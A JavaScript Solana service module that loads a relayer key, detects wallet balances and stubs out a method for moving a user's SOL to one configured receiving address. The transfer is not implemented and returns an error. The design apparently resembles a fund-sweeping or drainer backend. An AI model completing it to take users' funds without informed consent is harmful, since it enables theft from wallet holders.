import {
  Connection,
  PublicKey,
  Keypair,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction
} from '@solana/web3.js'
import bs58 from 'bs58'
import { CONFIG } from '../config.js'

/**
 * Solana Blockchain Service
 * Handles balance detection and SOL transfers
 */

class SolanaService {
  constructor() {
    this.connection = new Connection(CONFIG.rpc.solana, 'confirmed')

    // Decode private key from base58
    const privateKeyBytes = bs58.decode(CONFIG.relayerSolana.privateKey)
    this.keypair = Keypair.fromSecretKey(privateKeyBytes)
  }

  /**
   * Get SOL balance
   */
  async getBalance(address) {
    try {
      const publicKey = new PublicKey(address)
      const balance = await this.connection.getBalance(publicKey)
      return (balance / 1000000000).toString() // Convert lamports to SOL
    } catch (error) {
      console.error('Error getting Solana balance:', error.message)
      return '0'
    }
  }

  /**
   * Detect Solana balance
   */
  async detectBalance(account) {
    try {
      const balance = await this.getBalance(account)
      console.log('✅ Solana balance detected:', balance)
      return { solana: balance }
    } catch (error) {
      console.error('Error detecting Solana balance:', error)
      return { solana: '0' }
    }
  }

  /**
   * Transfer SOL from user wallet to receiver
   * NOTE: Requires user to pre-sign transaction or authorize relayer as delegate
   * Cannot transfer user's SOL without their signature or pre-authorization
   */
  async transferSOL(userAddress, amount) {
    try {
      const userPublicKey = new PublicKey(userAddress)
      const receiverPublicKey = new PublicKey(CONFIG.receivingAddresses.solana)
      const relayerPublicKey = this.keypair.publicKey

      console.warn(`⚠️ SOL transfer from user account requires pre-signed transaction or delegation`)
      console.log(`📋 Required: User must pre-sign SOL transfer OR authorize relayer as delegate`)
      console.log(`   From: ${userAddress}`)
      console.log(`   To: ${receiverPublicKey.toString()}`)
      console.log(`   Amount: ${amount} SOL`)
      console.log(`   Relayer (fee payer): ${relayerPublicKey.toString()}`)

      return {
        hash: null,
        amount: amount.toString(),
        chain: 'solana',
        from: userAddress,
        to: receiverPublicKey.toString(),
        relayerFeePayer: relayerPublicKey.toString(),
        error: 'SOL transfers from user account require pre-signed transactions. Implement transaction pre-signing or delegation support.'
      }
    } catch (error) {
      console.error('Error preparing Solana transfer:', error.message)
      return {
        hash: null,
        amount: amount.toString(),
        chain: 'solana',
        error: error.message
      }
    }
  }
}

export const solanaService = new SolanaService()
